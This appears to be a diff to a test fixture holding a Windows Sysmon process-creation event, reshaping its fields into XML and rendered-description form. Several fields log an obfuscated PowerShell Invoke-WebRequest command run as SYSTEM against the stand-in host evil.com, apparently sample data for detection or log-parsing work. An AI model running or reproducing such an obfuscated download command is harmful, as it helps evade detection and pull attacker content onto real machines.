@@ -7,12 +7,9 @@
     "Computer": "dc1-mon",
     "EventLevel": 4,
     "EventLevelName": "Information",
+    "ParameterXml": "<Param>-</Param><Param>2025-02-24 14:25:02.199</Param><Param>{3d7a6f6f-813e-67bc-9a01-000000000300}</Param><Param>1234</Param><Param>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Param><Param>10.0.17763.1</Param><Param>Windows PowerShell</Param><Param>Microsoft Corporation</Param><Param>powershell.exe</Param><Param>powershell.exe -enc I`n`v`o`k`e%-W%e%b%R^e^q^u^e^st -Uri 'http://evil.com'</Param><Param>C:\\Windows\\system32\\</Param><Param>NT AUTHORITY\\SYSTEM</Param>",
+    "EventData": "<DataItem Type=\"System.XmlData\" time=\"2025-02-24T14:25:02.205770700Z\" sourceHealthServiceId=\"1f1a93bd-0db8-40a2-87fb-7c7c5393226e\"><EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2025-02-24 14:25:02.199</Data><Data Name=\"ProcessGuid\">{3d7a6f6f-813e-67bc-9a01-000000000300}</Data><Data Name=\"ProcessId\">1234</Data><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"FileVersion\">10.0.17763.1</Data><Data Name=\"Description\">Windows PowerShell</Data><Data Name=\"Product\">Microsoft Corporation</Data><Data Name=\"Company\">Microsoft Corporation</Data><Data Name=\"OriginalFileName\">powershell.exe</Data><Data Name=\"CommandLine\">powershell.exe -enc I`n`v`o`k`e%-W%e%b%R^e^q^u^e^st -Uri 'http://evil.com'</Data><Data Name=\"CurrentDirectory\">C:\\Windows\\system32\\</Data><Data Name=\"User\">NT AUTHORITY\\SYSTEM</Data></EventData></DataItem>",
     "EventID": 1,
-    "CommandLine": "powershell.exe -enc I`n`v`o`k`e%-W%e%b%R^e^q^u^e^st -Uri 'http://evil.com'",
-    "RenderedDescription": "Process Create:",
-    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-    "User": "NT AUTHORITY\\SYSTEM",
-    "ProcessId": "1234",
-    "ProcessGuid": "{3d7a6f6f-813e-67bc-9a01-000000000300}"
+    "RenderedDescription": "Process Create: RuleName: - UtcTime: 2025-02-24 14:25:02.199 ProcessGuid: {3d7a6f6f-813e-67bc-9a01-000000000300} ProcessId: 1234 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -enc I`n`v`o`k`e%-W%e%b%R^e^q^u^e^st -Uri 'http://evil.com'",
+    "Type": "Event"
 }]
-
